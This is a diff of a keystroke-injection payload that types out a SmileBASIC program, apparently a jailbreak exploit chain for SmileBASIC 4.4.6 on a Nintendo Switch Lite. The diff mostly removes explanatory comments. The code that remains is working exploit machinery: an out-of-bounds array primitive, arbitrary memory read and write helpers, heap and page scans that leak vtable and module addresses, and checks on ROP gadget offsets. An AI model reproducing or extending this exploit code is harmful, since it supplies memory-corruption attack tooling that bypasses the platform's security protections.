@@ -1,15 +1,6 @@
 REM ns2jb 4.4.6 primitive library -- compact TapDucky payload
 DEFAULTDELAY 40
 DELAY 2500
-STRINGLN ' ns2jb -- 4.4.6 JP demo bootstrap (Switch Lite / FW 23.0.1)
-STRINGLN ' Direct-mode runtime order:
-STRINGLN '   LOAD "TXT:NS2"
-STRINGLN '   RUN
-STRINGLN '   REMOVE NSR,&H60000000,&H3FFFFFFF        <- expected: Out of memory
-STRINGLN '   '   V=HUNT5()         hunt the callback-object linked list
-STRINGLN '   V=S6DIST()        pointer distribution in the heap (sets PT6# for S4M)
-STRINGLN ' NOTE: error branches use the proven v21 idiom only:
-STRINGLN '       X$=PLOG(...):SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
 STRINGLN VAR NSR,V$,D$,S$,A$,X$,OD$,OD2$,ZERO$,CAP$,I,J,R
 STRINGLN VAR PHASE=0,OFFA#,B#,C#,T#,E0#,E2#,E3#,KH#,SH#,DGP#,K#,CNT#,PG#,SCAN#,M#,MM#,D#,G#,S2#,PT6#
 STRINGLN DIM MDATA#[8]
@@ -100,18 +91,6 @@ STRINGLN COPY NSR[1],0,A$
 STRINGLN X$=UNAIM()
 STRINGLN RETURN N
 STRINGLN END
-STRINGLN COMMON DEF WR#(A#,V#)
-STRINGLN RETURN WW(P$(V#),A#)
-STRINGLN END
-STRINGLN COMMON DEF WRO(A$,A#,O)
-STRINGLN VAR N
-STRINGLN N=LEN(A$)
-STRINGLN IF N<1 THEN RETURN 0
-STRINGLN X$=AIM(A#,N+O)
-STRINGLN COPY NSR[1],O,A$
-STRINGLN X$=UNAIM()
-STRINGLN RETURN N
-STRINGLN END
 STRINGLN COMMON DEF S1()
 STRINGLN VAR V#,V2
 STRINGLN X$=PLOG("== S1 ==")
@@ -180,8 +159,6 @@ STRINGLN ALL#=0
 STRINGLN K#=0
 STRINGLN BAD#=0
 STRINGLN BASE#=FLOOR(E0#/4096)*4096
-STRINGLN ' Scan UPWARD from the page containing E0#: the type-5 anchor was found at
-STRINGLN ' E0#+0x970, i.e. ABOVE the window. Contiguous 4096-byte stride, 256 pages = 1 MB.
 STRINGLN FOR PG#=0 TO 255
 STRINGLN PAGE#=BASE#+PG#*4096
 STRINGLN D$=RD(PAGE#,2048)
@@ -237,9 +214,6 @@ STRINGLN HI#=0
 STRINGLN BAD#=0
 STRINGLN LOG6#=0
 STRINGLN PT6#=0
-STRINGLN ' Scan UPWARD, CONTIGUOUS 4096-byte stride, 512 pages = 2 MB.
-STRINGLN ' Bands: LOW <16MB | MID 16MB..E0# | HEAP >= E0#. PT6# = LOWEST mid-range
-STRINGLN ' pointer seen, i.e. a .data vtable pointer candidate -> feeds S4M.
 STRINGLN FOR PG#=0 TO 511
 STRINGLN PAGE#=BASE#+PG#*4096
 STRINGLN D$=RD(PAGE#,2048)
@@ -286,9 +260,6 @@ STRINGLN BASE#=FLOOR(E0#/4096)*4096
 STRINGLN HIT#=0
 STRINGLN CHK#=0
 STRINGLN MINC#=0
-STRINGLN ' Scan UPWARD, contiguous 4096-byte stride, 128 pages = 512 KB.
-STRINGLN ' Node signature from FUN_71001dac50: *(node-0x258) = .text callback ptr,
-STRINGLN ' *(node+8) = next node. obj = node - 0x3D8.
 STRINGLN FOR PG#=0 TO 127
 STRINGLN PAGE#=BASE#+PG#*4096
 STRINGLN D$=RD(PAGE#,2048)
@@ -320,9 +291,6 @@ STRINGLN END
 STRINGLN COMMON DEF S8OBJ()
 STRINGLN VAR Q$,SH#,SN1#,SL1#,AIM2$
 STRINGLN X$=PLOG("== S8 ==")
-STRINGLN ' Port of the proven 4.4.9 derivation: the object pointer is NOT scanned for,
-STRINGLN ' it is read out of the window itself. B# = W0 = the window base, so B#+8
-STRINGLN ' holds W1 (slot1's data pointer). S8 ports that directly.
 STRINGLN IF E0#==0 THEN X$=PLOG("S8 NEED S1"):IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
 STRINGLN SH#=U#(MID$(V$,4,4))
 STRINGLN X$=PLOG("S8 SH "+HX$(SH#))
@@ -333,8 +301,6 @@ STRINGLN SN1#=U#(LEFT$(Q$,4))
 STRINGLN SL1#=U#(MID$(Q$,4,4))
 STRINGLN X$=PLOG("S8 SN "+HX$(SN1#)+" LEN "+STR$(SL1#))
 STRINGLN X$=PLOG("S8 HEX "+DUMPH$(Q$))
-STRINGLN ' 4.4.9 requires the second word to be 262144 (0x40000). If 4.4.6 differs,
-STRINGLN ' report the value we see so the constant can be derived, do not fail blind.
 STRINGLN IF SL1#==262144 THEN
 STRINGLN S2#=SN1#
 STRINGLN X$=PLOG("S8 OBJ FOUND "+HX$(S2#))
@@ -349,10 +315,6 @@ STRINGLN END
 STRINGLN COMMON DEF S4M()
 STRINGLN VAR D$,P#,H#,N,PG#
 STRINGLN X$=PLOG("== S4M ==")
-STRINGLN ' SAFETY: probing downward from PT6# faults SmileBASIC once the read leaves the
-STRINGLN ' mapped module image. Do NOT ladder. M# is derived from PT6# via S10VT's vtable
-STRINGLN ' instead: identify the .data offset from the relocation delta table, then
-STRINGLN ' M# = PT6# - offset. S10VT finds the vtable; MDATA# set below once identified.
 STRINGLN IF MDATA#[0]>0 THEN
 STRINGLN M#=PT6#-MDATA#[0]
 STRINGLN X$=PLOG("MFOUND "+HX$(M#)+" DELTA "+HX$(MDATA#[0]))
@@ -368,8 +330,6 @@ STRINGLN VAR D$,J,V#,PG#,PAGE#,BASE#
 STRINGLN X$=PLOG("== S9 ==")
 STRINGLN X$=PLOG("W0 "+HX$(E0#))
 STRINGLN BASE#=FLOOR(E0#/4096)*4096
-STRINGLN ' Dump 4KB upward from E0#: the heap lives here (S6 confirmed)
-STRINGLN ' 64 chars per read (256 hex chars) - stays within SmileBASIC string limits
 STRINGLN FOR PG#=0 TO 3
 STRINGLN PAGE#=BASE#+PG#*4096
 STRINGLN D$=RD(PAGE#,64)
@@ -387,9 +347,6 @@ STRINGLN X$=PLOG("W0 "+HX$(E0#))
 STRINGLN BASE#=FLOOR(E0#/4096)*4096
 STRINGLN HIT#=0
 STRINGLN N=0
-STRINGLN ' Scan UPWARD, 2MB (the earlier upward scan found 498 sub-heap values but the
-STRINGLN ' old filter hid any in-band ones). Band [16MB, 1GB) is a hard module band:
-STRINGLN ' heap is ~500GB so nothing in-band can be a heap pointer. Contiguous stride.
 STRINGLN FOR PG#=0 TO 511
 STRINGLN PAGE#=BASE#+PG#*4096
 STRINGLN D$=RD(PAGE#,2048)
@@ -412,9 +369,6 @@ STRINGLN RETURN 1
 STRINGLN END
 STRINGLN COMMON DEF S15VTB()
 STRINGLN VAR D$,J,V#,N,OBJ#,VT#
-STRINGLN ' NSR is Array!(Array!wchar): each element is a pointer to an Array!wchar D
-STRINGLN ' class whose FIRST 8 bytes are its vtable -> a .rodata address in the module.
-STRINGLN ' W1/W2/W3 (window words 1..3) are exactly those sibling object pointers.
 STRINGLN X$=PLOG("== S15 ==")
 STRINGLN X$=PLOG("W0 "+HX$(E0#))
 STRINGLN N=0
@@ -441,18 +395,9 @@ STRINGLN RETURN 1
 STRINGLN END
 STRINGLN COMMON DEF S16OBJ()
 STRINGLN VAR D$,J,V#,N,OBJ#,VT#,P#
-STRINGLN ' Materialise interpreter-owned D objects, then read their vtable.
-STRINGLN ' Text consoles / sprites etc. are real classes on a Switch port; the safest
-STRINGLN ' anchor is the currently bound text screen, reached via the SB4 console
-STRINGLN ' object. We enumerate what is reachable from the variable table beyond our
-STRINGLN ' own array: any pointer into a DIFFERENT heap region that is not one of our
-STRINGLN ' sibling string arrays.
 STRINGLN X$=PLOG("== S16 ==")
 STRINGLN X$=PLOG("W0 "+HX$(E0#))
 STRINGLN N=0
-STRINGLN ' Widen: walk the sibling chain forward (descriptors are 0x40 apart per S15)
-STRINGLN ' up to 64 slots, and report any pointer that does NOT point back into the
-STRINGLN ' 0x400-byte sibling band around E0#.
 STRINGLN FOR J=4 TO 255 STEP 4
 STRINGLN V#=U#(MID$(V$,J,4))
 STRINGLN IF PTR(V#,16) THEN
@@ -463,9 +408,6 @@ STRINGLN ENDIF
 STRINGLN ENDIF
 STRINGLN NEXT
 STRINGLN X$=PLOG("S16 FARCOUNT "+STR$(N))
-STRINGLN ' Also try: the interpreter's type tags. A real D class vtable lives in the
-STRINGLN ' module; probe a handful of known interpreter object shapes via the fact
-STRINGLN ' that their first word must be in [16MB,1GB). Read past our sibling band.
 STRINGLN P#=E0#+4194304
 STRINGLN D$=RD(P#,256)
 STRINGLN IF LEN(D$)>=256 THEN
@@ -483,13 +425,8 @@ STRINGLN RETURN 1
 STRINGLN END
 STRINGLN COMMON DEF S17T5()
 STRINGLN VAR D$,J,V#,L#,N,P5#,T5V#
-STRINGLN ' Modelled on the REAL 4.4.9 source (not my earlier guess):
-STRINGLN '   KH# comes from B#+8 (slot-1 descriptor), and the type-5 tag record is found
-STRINGLN '   at KH#'s page. On 4.4.6 the matching record is at E0#+0x970 with residue
-STRINGLN '   &HE50. Its +0 field is what 4.4.9 calls V# (candidate module pointer).
 STRINGLN X$=PLOG("== S17 ==")
 STRINGLN X$=PLOG("W0 "+HX$(E0#))
-STRINGLN ' Re-locate the type-5 record by scanning our own window page, then deref it.
 STRINGLN D$=RD(E0#,1024)
 STRINGLN IF LEN(D$)<1024 THEN X$=PLOG("S17 SHORT"):IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
 STRINGLN N=0
@@ -520,10 +457,6 @@ STRINGLN RETURN 1
 STRINGLN END
 STRINGLN COMMON DEF S14SCAN()
 STRINGLN VAR D$,J,V#,PG#,PAGE#,BASE#,HIT#,N
-STRINGLN ' Contiguous 4MB scan of the SmileBASIC variable table ABOVE the window.
-STRINGLN ' W1..W3 are 0x20 apart and are slot descriptors; the table continues past
-STRINGLN ' W3. Reading contiguously (no graph walk, no cycling risk) finds the first
-STRINGLN ' module-band pointer, which is a MEASURED .rodata vtable address -> M#.
 STRINGLN BASE#=FLOOR(E0#/4096)*4096
 STRINGLN HIT#=0
 STRINGLN N=0
@@ -553,8 +486,6 @@ STRINGLN COMMON DEF S12GAD()
 STRINGLN X$=PLOG("== S12 ==")
 STRINGLN X$=PLOG("M# "+HX$(M#))
 STRINGLN IF M#==0 THEN X$=PLOG("S12 NEED M# - run V=S11CONF() first"):IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
-STRINGLN ' Offline-scanned gadget offsets (.text-relative) from tools/gadget2.py.
-STRINGLN ' Verifies each by reading 4 bytes at M#+offset.
 STRINGLN X$=PLOG("S12 A 00B6D8 "+DUMPH$(RD(M#+47512,4)))
 STRINGLN X$=PLOG("S12 B 00B6D8 "+DUMPH$(RD(M#+47512,4)))
 STRINGLN X$=PLOG("S12 C 15E004 "+DUMPH$(RD(M#+1439748,4)))
@@ -565,10 +496,6 @@ STRINGLN RETURN 1
 STRINGLN END
 STRINGLN COMMON DEF S25OBJ()
 STRINGLN VAR D$,J,V#,O#
-STRINGLN ' pepsipu's blog: "the 8 bytes preceding any array in SmileBASIC contain a
-STRINGLN ' pointer to the array itself." That pointer O is the INTERPRETER OBJECT that
-STRINGLN ' owns the array. E0# is the backing; O = *(E0# - 8). O is a C++ object with
-STRINGLN ' a vtable in the module -> M#.
 STRINGLN X$=PLOG("== S25 ==")
 STRINGLN X$=PLOG("W0 "+HX$(E0#))
 STRINGLN IF E0#<16 THEN X$=PLOG("S25 LOW") :IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
@@ -595,13 +522,9 @@ STRINGLN RETURN 1
 STRINGLN END
 STRINGLN COMMON DEF S26OBJ()
 STRINGLN VAR D$,J,V#,O#
-STRINGLN ' Correct object-pointer location per the author's mechanism:
-STRINGLN ' descriptor.ptr (E0#+0x20) points to data at +0x10 = E0#+0x30
-STRINGLN ' the 8 bytes BEFORE that data = E0#+0x28 = the array's object pointer O.
-STRINGLN ' O is the interpreter object with a vtable in the module.
 STRINGLN X$=PLOG("== S26 ==")
 STRINGLN X$=PLOG("W0 "+HX$(E0#))
-STRINGLN D$=RD(E0#+0x28,16)
+STRINGLN D$=RD(E0#+&H28,16)
 STRINGLN IF LEN(D$)<16 THEN X$=PLOG("S26 SHORT "+STR$(LEN(D$))):IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
 STRINGLN X$=PLOG("S26 HEX "+DUMPH$(D$))
 STRINGLN O#=U#(MID$(D$,0,4))
@@ -624,13 +547,6 @@ STRINGLN RETURN 1
 STRINGLN END
 STRINGLN COMMON DEF S24LINK()
 STRINGLN VAR D$,J,V#,PG#,PAGE#,BASE#,HIT#,N,ZT#
-STRINGLN ' Real allocator-anchor predicate, from ounceloader metadata.py links_from():
-STRINGLN '   at 0x4000 stride, find a u64 that is
-STRINGLN '     > 2^32  and  < 2^39          (module/heap band: 4GB..512GB)
-STRINGLN '     % 0x4000 == 0               (page aligned)
-STRINGLN '     abs(value - seed) < 0x2000000
-STRINGLN '     next 56 bytes all zero      (zeroTail)
-STRINGLN ' Our earlier 0x58-pair and [16MB,1GB) band tests used the WRONG predicate.
 STRINGLN BASE#=FLOOR(E0#/4096)*4096
 STRINGLN HIT#=0
 STRINGLN N=0
@@ -640,8 +556,6 @@ STRINGLN FOR PG#=0 TO 255
 STRINGLN PAGE#=BASE#+PG#*4096
 STRINGLN D$=RD(PAGE#,2048)
 STRINGLN IF LEN(D$)<2048 THEN X$=PLOG("S24PG "+STR$(PG#)+" SHORT"):GOTO @S24OUT
-STRINGLN ' test only every 0x4000 (2 chars... no: 0x4000 bytes = 0x2000 chars); we read
-STRINGLN ' one page at a time so each page start IS the aligned slot.
 STRINGLN V#=U#(MID$(D$,0,4))
 STRINGLN ZT#=1
 STRINGLN FOR J=4 TO 60 STEP 4
